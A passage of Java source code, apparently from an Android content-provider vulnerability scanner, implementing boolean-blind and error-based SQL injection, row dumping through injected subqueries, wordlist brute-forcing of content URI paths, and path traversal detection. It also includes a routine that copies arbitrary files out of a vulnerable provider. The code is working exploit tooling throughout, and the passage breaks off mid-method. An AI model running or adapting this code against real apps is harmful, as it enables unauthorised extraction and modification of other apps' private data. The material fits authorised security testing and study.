                    if (fields.size() > 0 && from != null) {
                        String[] row = new String[fields.size()];
                        for (int j = 0; j < fields.size(); j++) {
                            String fieldSql = "SELECT " + fields.get(j) + " FROM " + from + order + " LIMIT 1 OFFSET " + i;
                            uniBuilder.setInput("(" + fieldSql + ")");
                            CPVector testVector = uniBuilder.getRenderedVector();
                            cur = query(testVector.getUri(), testVector.getProjection(), testVector.getWhere(), testVector.getSelectionArgs(), testVector.getSortOrder());
                            if (cur != null && cur.getCount() > 0) {
                                // Check last row
                                String[] fieldRow = getRow(cur, cur.getCount() - 1);
                                row[j] = fieldRow[plCol];
                            }
                        }
                        int rowLen = 0;
                        for (String field : row) {
                            if (field != null) {
                                rowLen += field.length();
                            }
                        }
                        if (rowLen > 0) {
                            rows.add(row);
                        } else {
                            logWarn("Row " + (i + 1) + " was empty");
                        }
                    }
                }
            }
        } catch (Exception e) {
            handleUnexpectedTestException(e, vector, payload);
        } finally {
            if (cur != null) {
                cur.close();
            }
        }
        return rows;
    }

    private String[] getRow(Cursor cursor, int pos) {
        if (cursor.moveToPosition(pos)) {
            String[] row = new String[cursor.getColumnCount()];
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                try {
                    // Try getting each column as a string
                    row[i] = cursor.getString(i);
                } catch (SQLiteException se) {
                    if (se.getMessage().contains("Unable to convert BLOB to string")) {
                        // Sometimes its not possible to get as a string so get a blob instead
                        byte[] colBlob = cursor.getBlob(i);
                        row[i] = new String(colBlob, Charset.defaultCharset());
                    }
                }
            }
            return row;
        }
        return null;
    }

    private ArrayList<String[]> getRows(Cursor cursor) {
        if (cursor == null) {
            return null;
        }
        ArrayList<String[]> rows = new ArrayList<>();
        if (cursor.moveToFirst()){
            do {
                String[] row = new String[cursor.getColumnCount()];
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    try {
                        // Try getting each column as a string
                        row[i] = cursor.getString(i);
                    } catch (SQLiteException se) {
                        if (se.getMessage().contains("Unable to convert BLOB to string")) {
                            // Sometimes its not possible to get as a string so get a blob instead
                            byte[] colBlob = cursor.getBlob(i);
                            row[i] = new String(colBlob, Charset.defaultCharset());
                        }
                    }
                }
                rows.add(row);
            } while ((getIntegerOption("dump_limit") == null || cursor.getPosition() < getIntegerOption("dump_limit")) && cursor.moveToNext());
        }
        return rows;
    }

    public void printRows(ArrayList<String[]> rows) {
        if (!Util.nullOrEmpty(rows)) {
            String[] rowsStrSplit = Util.getRowsAsStringArr(rows);
            for (String row : rowsStrSplit) {
                logInf(row);
            }
        }
    }

    private void handleUnexpectedTestException(Exception ex, CPVector vector, Payload payload) {
        if (ex == null || ex.getMessage() == null) {
            return;
        }
        String exMessage = ex.getMessage();
        String[] ignoreMsgs = new String[] {
                "syntax error",
                "unrecognized token",
                "Unknown URI",
                "string or blob too big",
                "Unrecognized URI"
        };
        for (String ignoreMsg : ignoreMsgs) {
            if (exMessage.contains(ignoreMsg)) {
                return;
            }
        }
        String msg = String.format("Unexpected error: %s. Vector: %s. Payload: %s", exMessage, vector, payload);
        logErr(msg);
        //ex.printStackTrace();
        if (errorLogWriter != null) {
            errorLogWriter.write(msg + "\n");
            PrintWriter printWriter = new PrintWriter(errorLogWriter);
            ex.printStackTrace(printWriter);
            errorLogWriter.println("\n");
        }
    }

    private QueryResult getBaselineQuery(CPVector vector, BooleanBlindPayload payload, ProviderInfo pInfo) {

        // Check vector is supported by the payload
        if (!payload.isSupportedVector(vector)) {
            return new QueryResult((Cursor) null, vector, payload);
        }

        // Get baseline read query
        Cursor baseCur = null;

        BooleanBlindPayload.Builder boolBuilder = new BooleanBlindPayload.Builder(payload, vector);

        if (hasProviderOrPathPermission(pInfo, true, boolBuilder.getVector().getUri())) {
            CPVector baseVector;
            try {
                baseVector = boolBuilder.getRenderedVector();
                baseCur = query(baseVector.getUri(), baseVector.getProjection(), baseVector.getWhere(), baseVector.getSelectionArgs(), baseVector.getSortOrder());
                return new QueryResult(baseCur, boolBuilder.getVector(), boolBuilder.build());
            } catch (Exception e) {
                if (e.getMessage() != null) {
                    if (e.getMessage().contains("Cannot bind argument")) {
                        if (boolBuilder.build().getConditions().size() < DISCOVER_COLCOND_LIMIT) {
                            boolBuilder.addPlaceholderCondition();
                            logWarn("'Cannot bind argument' error returned for baseline query, added condition/placeholder to payload, now: " + boolBuilder.build());
                            return getBaselineQuery(boolBuilder.getVector(), boolBuilder.build(), pInfo);
                        } else {
                            logWarn("'Cannot bind argument' error returned for baseline query, given up adding condition/placeholder to payload :(");
                        }
                    } else if (e.getMessage().contains("no such column: rowid")) {
                        // WITHOUT ROWID tables (https://www.sqlite.org/withoutrowid.html)? Modify the boolBuilder.getVector() in-place and retry
                        logWarn("'no such column: rowid' error returned for baseline query, probable WITHOUT ROWID table");
                        if (boolBuilder.handleWithoutRowid(boolBuilder.getVector())) {
                            return getBaselineQuery(boolBuilder.getVector(), boolBuilder.build(), pInfo);
                        }
                    } else {
                        handleUnexpectedTestException(e, boolBuilder.getVector(), boolBuilder.build());
                    }
                }
            } finally {
                if (baseCur != null) {
                    baseCur.close();
                }
            }
        }

        return new QueryResult((Cursor) null, boolBuilder.getVector(), boolBuilder.build());
    }

    private UpdateResult getUpdateResult(boolean cond, String extra, CPVector vector, BooleanBlindPayload payload, ProviderInfo pInfo) {

        // Check vector is supported by the payload
        if (!payload.isSupportedVector(vector)) {
            return new UpdateResult(-1, vector, payload);
        }

        int res = -1;
        BooleanBlindPayload.Builder boolBuilder = new BooleanBlindPayload.Builder(payload, vector);
        boolBuilder.setBoolState(cond);
        boolBuilder.setExtra(extra);

        if (boolBuilder.getVector().getType() == CPVector.CVALS_KEY || boolBuilder.getVector().getType() == CPVector.QPARAM_KEY || boolBuilder.getVector().getType() == CPVector.URI_SEGMENT || boolBuilder.getVector().getType() == CPVector.URI_ID) {
            // Special handling for content value/query param keys/uri segments.. Skip payloads with >0 brackets or non-null quotes, payloads must end with comments
            if (boolBuilder.build().getLBrackets() > 0 || boolBuilder.build().getRBrackets() > 0 || boolBuilder.build().getQuoteChar() != null || !boolBuilder.build().endsWithComment()) {
                return new UpdateResult(-1, boolBuilder.getVector(), boolBuilder.build());
            }

            // Modify the rendered payload to fit the UPDATE SET key=val syntax
            String boolField = boolBuilder.build().getField();
            String customField = null;
            if (!boolField.toLowerCase().contains(" where ")) {
                if (!Payload.isLogicalExpression(boolField)) {
                    customField = boolField + "=1 WHERE " + boolField;
                } else {
                    customField = boolField + " WHERE " + boolField;
                }
                boolBuilder.setField(customField);
            }

            if (boolBuilder.getVector().getType() == CPVector.URI_SEGMENT && boolBuilder.getVector().isTableInjectionVector() && customField != null && !customField.toLowerCase().contains(" set ")) {
                // In the case of uri segments, add a <table> SET prefix
                customField = boolBuilder.getVector().getTable() + " SET " + customField;
                boolBuilder.setField(customField);
            } else if (boolBuilder.getVector().getType() == CPVector.URI_ID && boolBuilder.getVector().isTableInInjectionVector() && customField != null && !customField.toLowerCase().contains(" set ")) {
                // In the case of uri ids, add a SET prefix
                customField = " SET " + customField;
                boolBuilder.setField(customField);
            }
        }

        Uri insUri = null;
        if (hasProviderOrPathPermission(pInfo, false, boolBuilder.getVector().getUri())) {
            res = canUpdateVectorWithPayload(boolBuilder.getVector(), boolBuilder.build());
            if (res == -1) {
                // Cant update the original vector Uri, try getting one via insert
                ContentValues vals = CPVector.getBasicContentValuesForUpdateVector();
                if ((insUri = getInsertUri(boolBuilder.getVector(), vals)) != null && (res = canUpdateVectorWithPayload(boolBuilder.getVector().copy(insUri), boolBuilder.build())) != -1) {
                    // Can acquire and update a newly obtained insert uri so use that
                    boolBuilder.setVector(boolBuilder.getVector().copy(insUri));
                }
            }

            if (insUri != null) {
                // Attempt delete of the generated insert Uri if it is not null
                try {
                    delete(insUri, null, null);
                } catch (Exception e) {}
            }
        }

        return new UpdateResult(res, boolBuilder.getVector(), boolBuilder.build());
    }

    private QueryResult getBooleanQuery(boolean cond, String extra, CPVector vector, BooleanBlindPayload payload, ProviderInfo pInfo) {

        // Check vector is supported by the payload
        if (!payload.isSupportedVector(vector)) {
            return new QueryResult((Cursor) null, vector, payload);
        }

        Cursor boolCur = null;

        BooleanBlindPayload.Builder boolBuilder = new BooleanBlindPayload.Builder(payload, vector);
        boolBuilder.setBoolState(cond);
        boolBuilder.setExtra(extra);

        if (hasProviderOrPathPermission(pInfo, true, boolBuilder.getVector().getUri())) {
            CPVector testVector = boolBuilder.getRenderedVector();
            try {
                boolCur = query(testVector.getUri(), testVector.getProjection(), testVector.getWhere(), testVector.getSelectionArgs(), testVector.getSortOrder());
                return new QueryResult(boolCur, boolBuilder.getVector(), boolBuilder.build());
            } catch (Exception e) {
                if (e.getMessage() != null) {
                    if (e.getMessage().contains("Cannot bind argument")) {
                        logWarn("'Cannot bind argument' error returned for (" + cond + ") payload: " + boolBuilder.build());
                        if (boolBuilder.build().getConditions().size() < DISCOVER_COLCOND_LIMIT) {
                            boolBuilder.addPlaceholderCondition();
                            logWarn("'Cannot bind argument' error returned for (true) payload, added condition/placeholder to payload, now: " + boolBuilder.build());
                            return getBooleanQuery(cond, extra, boolBuilder.getVector(), boolBuilder.build(), pInfo);
                        } else {
                            logWarn("'Cannot bind argument' error returned for (true) payload, given up adding condition/placeholder to payload :(");
                        }
                    } else if (e.getMessage().contains("no such column: rowid")) {
                        // WITHOUT ROWID tables (https://www.sqlite.org/withoutrowid.html)? Modify the boolBuilder.getVector() in-place and retry
                        logWarn("'no such column: rowid' error returned for boolean query, probable WITHOUT ROWID table");
                        if (boolBuilder.handleWithoutRowid(boolBuilder.getVector())) {
                            return getBooleanQuery(cond, extra, boolBuilder.getVector(), boolBuilder.build(), pInfo);
                        }
                    } else {
                        handleUnexpectedTestException(e, boolBuilder.getVector(), boolBuilder.build());
                    }
                }
            } finally {
                if (boolCur != null) {
                    boolCur.close();
                }
            }
        }

        return new QueryResult((Cursor) null, boolBuilder.getVector(), boolBuilder.build());
    }

    private Uri getSubPathUri(Uri uri) {
        List<String> pathSegs = uri.getPathSegments();
        // Only get the sub path if there is at least 1 segment remaining
        if (pathSegs == null || pathSegs.size() < 1) {
            return uri;
        }
        // Join with /
        StringBuilder newPath = new StringBuilder();
        for (int i = 0; i < pathSegs.size() - 1; i++) {
            newPath.append("/" + pathSegs.get(i));
        }
        return Uri.parse("content://" + uri.getAuthority() + newPath + "*");
    }

    private boolean validatePathTraversalInputStream(InputStream travIs, PathTraversalPayload pathTraversalPayload) {
        if (travIs != null) {
            FileInputStream fis = null;
            try {
                // Compare the payload and absolute input streams
                fis = new FileInputStream(new File(pathTraversalPayload.getTargetPath()));
                String absContent = Util.readStreamToString(fis);
                String plContent = Util.readStreamToString(travIs);
                return absContent != null && absContent.trim().length() > 0 && absContent.equals(plContent);
            } catch (FileNotFoundException fnfe) {
                logWarn("FileNotFoundException validating path traversal: " + fnfe.getMessage());
            } finally {
                if (fis != null) {
                    try { fis.close(); } catch (IOException ioe) {};
                }
            }
        }
        return false;
    }

    private TestResult testPathTraversal(CPVector vector, PathTraversalPayload payload) {

        // Only test URI vectors that do not end in a slash (taking the injection placeholder into account)
        if (vector.getType() != CPVector.URI_ID || (vector.getUri().getPath() != null && vector.getUri().getPath().replace(CPVector.injectionChar, "").endsWith("/"))) {
            return new TestResult(vector, payload, false);
        }

        PathTraversalPayload.Builder travBuilder = new PathTraversalPayload.Builder(payload, vector);
        Uri plVectorUri = travBuilder.getRenderedVector().getUri(false);
        if (urisTraversed.contains(plVectorUri)) {
            // We have travelled this path before..
            return new TestResult(vector, travBuilder.build(), false);
        }

        // Only traverse if the uri is not already pointing to a file
        boolean foundTraversal = false;
        boolean hasFatalErr = false;
        InputStream tempIs = null;
        CPVector testVector = null;
        while (travBuilder.build().getNumTrav() <= TRAVERSAL_PATH_LIMIT && !foundTraversal && !hasFatalErr) {
            try {
                testVector = travBuilder.getRenderedVector();
                tempIs = context.getContentResolver().openInputStream(testVector.getUri());
                if (validatePathTraversalInputStream(tempIs, payload)) {
                    foundTraversal = true;
                }
            } catch (FileNotFoundException fnfe) {
                //NOP
            } catch (SecurityException se) {
                logWarn("SecurityException testing path traversal: " + se.getMessage());
                invalidAuthorities.add(Util.getAuthorityFromVector(testVector));
                hasFatalErr = true;
            } catch (Exception e) {
                logErr("Unexpected error for path traversal query: " + e.getMessage());
            } finally {
                if (testVector != null) {
                    urisTraversed.add(testVector.getUri(false));
                }
                if (tempIs != null) {
                    try { tempIs.close(); } catch (IOException ioe) {};
                }
            }

            if (!foundTraversal) {
                // Add a traversal
                travBuilder.addNumTrav();
            }
        }

        // If nothing found, and at least one path segment exists in the uri, traverse the path backwards and recurse
        Uri subUri = getSubPathUri(vector.getUri());
        if (!foundTraversal && !Util.compareUriPaths(vector.getUri(), subUri) && shouldTraversePath(vector.copy(subUri))) {
            vector.setUri(subUri);
            // Reset payload to 0 traversals
            travBuilder.setNumTrav(0);
            return testPathTraversal(vector, travBuilder.build());
        }

        return new TestResult(travBuilder.getVector(), travBuilder.build(), foundTraversal);
    }

    private QueryResult testBooleanBlindQuery(CPVector vector, BooleanBlindPayload payload, ProviderInfo pInfo) {

        // Check vector is supported by the payload
        if (!payload.isSupportedVector(vector)) {
            return new QueryResult((Cursor) null, vector, payload);
        }

        // Vector is either read or write
        BooleanBlindPayload workingPayload = null;
        CursorMeta baseCurData = null;

        if (hasProviderOrPathPermission(pInfo, true, vector.getUri())) {
            // Get baseline read query
            QueryResult baselineQueryResult = getBaselineQuery(vector, payload, pInfo);
            baseCurData = baselineQueryResult.getCursorMeta();

            // Expect the baseline cursor to not be null
            if (!baseCurData.isNull()) {
                BooleanBlindPayload testReadPayload = new BooleanBlindPayload.Builder(payload, vector).build();
                // If the payload is not null, and the payload in the result object does not match, use the payload from the result
                if (baselineQueryResult.getPayload() != null && !testReadPayload.equals(baselineQueryResult.getPayload())) {
                    testReadPayload = (BooleanBlindPayload) baselineQueryResult.getPayload();
                }

                // Cursors closed in getBooleanQuery()
                CursorMeta trCur = getBooleanQuery(true, "", vector, testReadPayload, pInfo).getCursorMeta();
                CursorMeta faCur = getBooleanQuery(false, "", vector, testReadPayload, pInfo).getCursorMeta();

                // Boolean payloads acting on row count (need rows to determine)
                if (trCur != null && faCur != null && ((trCur.getNumRows() == baseCurData.getNumRows() && faCur.getNumRows() != trCur.getNumRows()) || (faCur.getNumRows() == baseCurData.getNumRows() && trCur.getNumRows() != faCur.getNumRows()))) {
                    workingPayload = testReadPayload;
                }

                // Boolean zeroblob error-based payloads (no rows required, but not as good for dumping)
                if (workingPayload == null && (trCur != null && faCur == null || faCur != null && trCur == null) && testReadPayload.getPayload().contains("zeroblob(")) {
                    workingPayload = testReadPayload;
                }
            }
        }

        // Return baseline cursor meta as its most likely to be non-null
        return workingPayload != null ? new QueryResult(baseCurData, vector, workingPayload) : new QueryResult((Cursor) null, vector, payload);
    }

    private UpdateResult testBooleanBlindUpdate(CPVector vector, BooleanBlindPayload payload, ProviderInfo pInfo) {

        // Check vector is supported by the payload
        if (!payload.isSupportedVector(vector)) {
            return new UpdateResult(-1, vector, payload);
        }

        // Vector is either read or write
        BooleanBlindPayload workingPayload = null;
        int trRes = -1;
        int faRes = -1;

        if (hasProviderOrPathPermission(pInfo, false, vector.getUri())) {
            BooleanBlindPayload testUpdatePayload = new BooleanBlindPayload.Builder(payload, vector).build();
            UpdateResult updateResult = getUpdateResult(true, "", vector, testUpdatePayload, pInfo);
            // If the payload is not null, and the payload in the result object does not match, use the payload from the result
            if (updateResult.getPayload() != null && !testUpdatePayload.equals(updateResult.getPayload())) {
                testUpdatePayload = (BooleanBlindPayload) updateResult.getPayload();
            }

            trRes = updateResult.getResult();
            faRes = getUpdateResult(false, "", vector, testUpdatePayload, pInfo).getResult();

            if (trRes > 0 && faRes == 0) {
                workingPayload = testUpdatePayload;
            }

            if (workingPayload == null && trRes != -1 && faRes == -1 && testUpdatePayload.getPayload().contains("zeroblob(")) {
                workingPayload = testUpdatePayload;
            }
        }

        return workingPayload != null ? new UpdateResult(trRes, vector, workingPayload) : new UpdateResult(-1, vector, payload);
    }

    private String getHeuristicQuery(String errMsg, String plString) {
        String query = null;
        if (errMsg != null && errMsg.contains("unrecognized token")) {
            Pattern pattern = Pattern.compile("while compiling:(.+)");
            Matcher matcher = pattern.matcher(errMsg);
            while (matcher.find()) {
                query = matcher.group(1).replace(plString, "<injection>").trim();
            }

            if (query != null && query.trim().endsWith(")")) {
                query = query.trim().substring(0, query.length() - 1);
            }
        }
        return query;
    }

    private Set<TestResult> testBlindDetection(CPVector vector, ProviderInfo pInfo) {

        /*
         * This test can produce two distinct positive blind detection results (read/write)
         * But no point returning dupe test results so use a set
         */

        Set<TestResult> blindResList = new HashSet<>();

        // Use a simple boolean blind CASE/zeroblob payload that should trigger in most cirmcumstances(?)
        String customCaseBody = "CASE WHEN ([ICOND]) THEN zeroblob(999) ELSE zeroblob(99999999999999) END";
        BooleanBlindPayload booleanBlindPayload = BooleanBlindPayload.Payloads.get(
                new String[] {InjectionPayload.getDefaultField()},
                0,
                new char[] {0},
                new String[] {"AND"},
                new boolean[] {true},
                new String[] {customCaseBody}).iterator().next();

        // Check the vector is supported by the payload
        if (!booleanBlindPayload.isSupportedVector(vector)) {
            return new HashSet<>();
        }

        BooleanBlindPayload.Builder boolBuilder = new BooleanBlindPayload.Builder(booleanBlindPayload, vector);

        // Force the read/write test as there are no query strings to go on
        QueryResult blindRes = testBooleanBlindQuery(boolBuilder.getVector(), boolBuilder.build(), pInfo);
        if (blindRes.getStatus() && !blindRes.getCursorMeta().isNull()) {
            blindRes.getVector().setProviderProperties(pInfo);
            HashSet<String> colNames = new HashSet<>();
            Collections.addAll(colNames, blindRes.getCursorMeta().getCols());
            blindRes.getVector().setReadQueryFields(colNames);
            blindResList.add(blindRes);
        }
        UpdateResult blindUpdRes = testBooleanBlindUpdate(boolBuilder.getVector(), boolBuilder.build(), pInfo);
        if (blindUpdRes.getStatus()) {
            blindUpdRes.getVector().setProviderProperties(pInfo);
            blindUpdRes.getVector().setUpdateQueryFields(new HashSet<>(blindUpdRes.getVector().getValues().keySet()));
            blindResList.add(blindUpdRes);
        }

        return blindResList;
    }
    
    private Set<TestResult> testHeuristic(CPVector vector, ProviderInfo pInfo) {

        /*
         * This test can produce two distinct positive heuristic results (read/write)
         * But no point returning dupe test results so use a set
         */

        Set<TestResult> heurResList = new HashSet<>();
        Set<HeuristicPayload> payloads = (Set<HeuristicPayload>) getTestPayloads(HeuristicPayload.TYPE);

        if (payloads != null) {
            for (HeuristicPayload base : payloads) {
                String query;
                HeuristicPayload.Builder builder = new HeuristicPayload.Builder(base, vector);
                Cursor heurCur = null;
                int heurRes = -1;
                CPVector testVector = builder.getRenderedVector();
                if (hasProviderOrPathPermission(pInfo, true, builder.getVector().getUri())) {
                    try {
                        heurCur = query(testVector.getUri(), testVector.getProjection(), testVector.getWhere(), testVector.getSelectionArgs(), testVector.getSortOrder());
                    } catch (Exception e) {
                        query = getHeuristicQuery(e.getMessage(), builder.build().getPayload());
                        if (query != null) {
                            // Save a copy of the vector and set provider properties (only once)
                            builder.getVector().setQuery(query);
                            builder.getVector().setProviderProperties(pInfo);
                            heurResList.add(new QueryResult(heurCur, builder.getVector(), builder.build()));
                        }
                    } finally {
                        if (heurCur != null) {
                            heurCur.close();
                        }
                    }
                }

                if (hasProviderOrPathPermission(pInfo, false, builder.getVector().getUri())) {
                    try {
                        heurRes = update(testVector.getUri(), testVector.getValues(), testVector.getWhere(), testVector.getSelectionArgs());
                    } catch (Exception e) {
                        query = getHeuristicQuery(e.getMessage(), builder.build().getPayload());
                        if (query != null) {
                            // Save a copy of the vector and set provider properties (only once)
                            builder.getVector().setQuery(query);
                            builder.getVector().setProviderProperties(pInfo);
                            heurResList.add(new UpdateResult(heurRes, builder.getVector(), builder.build()));
                        }
                    }
                }
            }
        }

        return heurResList;
    }

    private File getTempFile(Context context, String name) {
        File file = null;
        try {
            file = File.createTempFile(name, null, context.getExternalCacheDir());
            file.deleteOnExit();
        } catch (IOException e) {
            logErr("IOException while creating temp file: " + e.getMessage());
        }
        return file;
    }

    private byte[] getZipFileBytes(ZipFile file, ZipEntry entry) {
        InputStream in = null;
        ByteArrayOutputStream out = null;
        try {
            out = new ByteArrayOutputStream();
            byte[] buf = new byte[1024];
            int len;
            in = file.getInputStream(entry);
            while ((len = in.read(buf)) > 0) {
                out.write(buf, 0, len);
            }
            return out.toByteArray();
        } catch (IOException ioe) {
            logErr("IOException reading ZipFile bytes: " + ioe.getMessage());
        } finally {
            try {
                if (in != null) {
                    in.close();
                }
                if (out != null) {
                    out.close();
                }
            } catch (IOException ioe) {
                Log.e(TAG, "IOException closing streams: " + ioe.getMessage());
            };
        }
        return null;
    }

    private String getLocalBinaryPath(String name) {
        String path = null;
        try {
            ArrayList<String> lines = new ArrayList<>();
            Process proc = Runtime.getRuntime().exec(new String[]{"which", name});
            proc.waitFor();
            if (proc.exitValue() == 0) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                String line;
                while ((line = reader.readLine())!= null) {
                    lines.add(line);
                }
                if (lines.size() > 0) {
                    path = lines.get(0);
                }
            }
        } catch (IOException ioe) {
            logErr("IOException getting local binary path: " + ioe.getMessage());
        } catch (InterruptedException ie) {
            logErr("InterruptedException getting local binary path: " + ie.getMessage());
        }
        return path;
    }

    private ArrayList<String> getStringsFromDex(File dexFile) {
        ArrayList<String> dexStrings = new ArrayList<>();
        if (stringsPath == null) {
            logWarn("Path to strings binary not set, cannot continue");
            return dexStrings;
        }

        BufferedReader reader = null;
        try {
            logInf("Searching for strings in file: " + dexFile.getAbsolutePath());
            String[] cmd = new String[] {stringsPath, dexFile.getAbsolutePath()};
            Process proc = Runtime.getRuntime().exec(cmd);

            reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));

            String line;
            while ((line = reader.readLine())!= null) {
                dexStrings.add(line);
            }

            String errLine;
            InputStream stderr = proc.getErrorStream();
            InputStreamReader esr = new InputStreamReader(stderr);
            BufferedReader ebr = new BufferedReader (esr);
            while ((errLine = ebr.readLine()) != null) {
                logWarn(errLine);
            }

            proc.waitFor();
        } catch (IOException ioe) {
            logErr("IOException getting strings from dex: " + ioe.getMessage());
        } catch (InterruptedException ie) {
            logErr("InterruptedException getting strings from dex: " + ie.getMessage());
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException ioe) {}
            }
        }
        return dexStrings;
    }

    private int getMaxDepth() {
        if (CUSTOM_DISCOVER_BRUTE_PATH_DEPTH > 0) {
            return CUSTOM_DISCOVER_BRUTE_PATH_DEPTH;
        } else {
            return DISCOVER_BRUTE_PATH_DEPTH;
        }
    }

    private int getMaxWords(int numProv) {
        if (CUSTOM_DISCOVER_BRUTE_WORD_LIMIT >= 0) {
            return CUSTOM_DISCOVER_BRUTE_WORD_LIMIT;
        } else if (numProv >= 0 && numProv < 4) {
            return DISCOVER_BRUTE_WORD_LIMIT;
        } else if (numProv >= 4 && numProv < 8) {
            return 2 * DISCOVER_BRUTE_WORD_LIMIT;
        } else {
            return 3 * DISCOVER_BRUTE_WORD_LIMIT;
        }
    }

    private Set<String> getBruteForceWordlist(Set<String> app, Set<String> apk) {
        Set<String> wordList = new HashSet<>(Arrays.asList(pathWords));
        wordList.addAll(app);
        wordList.addAll(apk);
        logInf("Got " + app.size() + " words from app components for the bruteforce wordlist");
        logInf("Got " + apk.size() + " words from APK binary for the bruteforce wordlist");
        return wordList;
    }

    private Set<Uri> spiderFoundUris(Map<Uri, String[]> foundUris, Set<String> wordList, ThreadPoolExecutor execSvc) {

        Set<Uri> spiderFoundPaths = new HashSet<>();
        int maxDepth = getMaxDepth();
        int currentDepth = 1;

        // Limit the wordlist to 1000
        wordList = Util.getRandomSet(wordList, 1000);
        Set<Uri> foundUriList = new HashSet<>(foundUris.keySet());

        while (maxDepth > currentDepth) {
            Set<Uri> urisForDepth = new HashSet<>();
            List<ProviderBruteForceCallable> callList = new ArrayList<>();

            for (Uri baseUri : foundUriList) {
                // Skip uris ending in a slash or digit
                if (baseUri.getPath() != null && (baseUri.getPath().endsWith("/") || baseUri.getPath().matches(".*/\\d+$"))) {
                    continue;
                }

                // Skip if we cant find the ProviderInfo for the authority
                ProviderInfo pInfo = getProviderInfo(baseUri.getAuthority());
                if (pInfo == null) {
                    continue;
                }

                callList.add(new ProviderBruteForceCallable(baseUri, wordList, pInfo));
            }

            if (callList.size() > 0) {
                try {
                    logInf("Queuing " + callList.size() + " thread(s) for brute forcing");
                    // invokeAll() should block until all are complete, or timeout after 15 mins
                    List<Future<List<Uri>>> futures = execSvc.invokeAll(callList, 15, TimeUnit.MINUTES);

                    // Threads have finished
                    logInf("Brute force threads have finished");
                    for (Future<List<Uri>> future : futures) {
                        try {
                            List<Uri> res = future.get();
                            if (res != null) {
                                urisForDepth.addAll(res);
                            }
                        } catch (ExecutionException ee) {
                            logErr("ExecutionException: " + ee.getMessage());
                        } catch (CancellationException ce) {
                            logErr("CancellationException: " + ce.getMessage());
                        }
                    }

                } catch (InterruptedException ie) {
                    logErr("InterruptedException: " + ie.getMessage());
                }
            }

            currentDepth++;
            // Save the paths found from this depth
            spiderFoundPaths.addAll(urisForDepth);
            // Next iteration will use the uris from this depth
            foundUriList = urisForDepth;

            logInf("Got " + urisForDepth.size() + " available paths for depth " + currentDepth);
        }

        return spiderFoundPaths;

    }

    private Map<Uri, String[]> getProviderUris(ProviderInfo pInfo, Set<String> wordList) {
        // Check for null authority (dont know why it would be, but it happens!)
        if (pInfo == null || pInfo.authority == null) {
            return null;
        }
        // Build the base URI from the provider authority (could be multiple authorities)
        Uri[] baseUris;
        if (!pInfo.authority.contains(";")) {
            // Single authority
            baseUris = new Uri[] {Uri.parse("content://" + pInfo.authority)};
        } else {
            // Multiple
            String[] authSplit = pInfo.authority.split(";");
            baseUris = new Uri[authSplit.length];
            for (int i = 0; i < authSplit.length; i++) {
                baseUris[i] = Uri.parse("content://" + authSplit[i]);
            }
            logInf("Found multiple authorities (" + baseUris.length + ") defined for provider");
        }

        Map<Uri, String[]> foundPaths = new HashMap<>();
        for (Uri baseUri : baseUris) {
            // Brute-force the paths!
            logInf("Attempting to brute-force content Uri paths for base URI: " + baseUri);
            Map<Uri, String[]> uriPaths = bruteUriPaths(baseUri, wordList, pInfo);
            logInf("Got " + uriPaths.size() + " available paths for depth 1");
            foundPaths.putAll(uriPaths);
        }
        return foundPaths;
    }

    public boolean copyFileUsingPathTraversal(CPReport report, String src, String dst) {
        if (src.trim().length() == 0) {
            logWarn("Invalid source path");
            return false;
        }
        if (!report.hasPathTraversalPayloads()) {
            logWarn("No path traversal vectors in report, cannot copy file");
            return false;
        }
        String[] pathSplit = src.split("/");
        String filename  = pathSplit[pathSplit.length - 1];
        if (!dst.endsWith("/")) {
            dst = dst + "/" + filename;
        } else {
            dst = dst + filename;
        }
        if (new File(dst).exists()) {
            logWarn("Destination path already exists: " + dst);
            return false;
        }
        InputStream travIs;
        CPExploit travVectorPayload = report.getPathTraversalExploit();
        try {
            PathTraversalPayload.Builder travBuilder = new PathTraversalPayload.Builder((PathTraversalPayload) travVectorPayload.getPayload(), travVectorPayload.getVector());
            travBuilder.setTargetPath(src);
            travIs = context.getContentResolver().openInputStream(travBuilder.getRenderedVector().getUri());
            if (travIs != null) {
                // copyFile() closes the stream
                return Util.copyFile(travIs, dst);
            }
        } catch (Exception e) {
            logErr("Exception copying file using path traversal: " + e.getMessage());
        }
        return false;
    }

    private boolean hasProviderOrPathPermission(ProviderInfo providerInfo, boolean forRead, Uri uri) {
        String perm;
        if (forRead) {
            perm = providerInfo.readPermission;
        } else {
            perm = providerInfo.writePermission;
        }

        // Path perms take precedence over provider perms, if they are defined
        boolean provPerm = hasPermission(perm);
        int pathPerm = hasPathPermission(providerInfo, forRead, uri);

        if (pathPerm == -1) {
            // Path perms were not defined, so just return provider perms
            return provPerm;
        } else {
            // Path perms are defined, and override global perms, so only check the path perm
            return pathPerm == 1;
        }
    }

    private int hasPathPermission(ProviderInfo providerInfo, boolean forRead, Uri uri) {
        /*
         * Return 1 of 3 statuses:
         * -1: Not defined
         *  0: Denied
         *  1: Allowed (default)
         */
        int status = 1;
        int uriPathMatch = 0;
        if (!Util.nullOrEmpty(providerInfo.pathPermissions)) {
            for (PathPermission pathPermission : providerInfo.pathPermissions) {
                PatternMatcher matcher = new PatternMatcher(pathPermission.getPath(), pathPermission.getType());
                // Only set the perm as false if uri path matches and app context does not have perm
                if (matcher.match(uri.getPath())) {
                    uriPathMatch++;
                    // hasPermission() deals with ignoring perms via opts
                    if (forRead && !hasPermission(pathPermission.getReadPermission())) {
                        status = 0;
                        break;
                    }
                    if (!forRead && !hasPermission(pathPermission.getWritePermission())) {
                        status = 0;
                        break;
                    }
                }
            }

            // If no paths were matched at this point, undefined for the uri
            if (uriPathMatch == 0) {
                status = -1;
            }
        } else {
            // Undefined
            status = -1;
        }

        return status;
    }

    private double getErrorRate(int ops, int errors) {
        if (ops == 0 || errors == 0) {
            return 0.0;
        }
        return errors / ops;
    }

    private Map<Uri, String[]> bruteUriPaths(Uri base, Set<String> words, ProviderInfo pInfo) {
        // Keep track of read/write ops and associated errs
        int readCount = 0;
        int readErrCount = 0;
        int writeCount = 0;
        int writeErrCount = 0;
        boolean bruteRead = true;
        boolean bruteWrite = true;

        Map<Uri, String[]> paths = new HashMap<>();
        // Attempt to query the paths
        for (String word : words) {
            // Return if the error rate hits the limit for read + write
            if (!bruteRead && !bruteWrite) {
                break;
            }

            if (paths.size() > DISCOVER_BRUTE_PATH_LIMIT) {
                logWarn("Hit path discovery limit (" + DISCOVER_BRUTE_PATH_LIMIT + "), stopping brute-force");
                break;
            }
